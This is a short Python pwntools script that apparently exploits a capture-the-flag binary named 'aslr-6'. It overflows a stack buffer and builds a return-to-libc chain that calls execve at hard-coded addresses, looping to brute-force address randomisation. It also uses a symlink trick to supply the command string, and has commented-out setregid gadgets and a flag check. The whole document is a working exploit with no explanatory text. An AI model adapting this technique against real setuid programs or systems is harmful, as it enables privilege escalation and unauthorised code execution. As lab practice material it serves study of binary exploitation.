#!/usr/bin/env python

from pwn import *
import os
i=0
while (i<100):
    p = process("./aslr-6")

    buf = "A" * 0x88 + "BBBB"
    i=i+1
    print(i)


    execve = p32(0xb7dde7e0)
    pop_pop_ret = p32(0x0000082a)

    #buf += setregid
    #buf += pop_pop_ret
    #buf += p32(50412)
    #buf += p32(50412)

    string = p32(0xb7dde958)

    if os.path.exists("\272"):
            os.unlink("\272")

    os.symlink("A","\272");

    buf += execve
    buf += p32(0)
    buf += string
    buf += p32(0)
    buf += p32(0)

    p.sendline(buf)

#p.sendline("cat flag;"*10)
 #   check = p.recvline()
  #  if 'cand{' in check:
   #     break
    p.interactive()
    p.close()

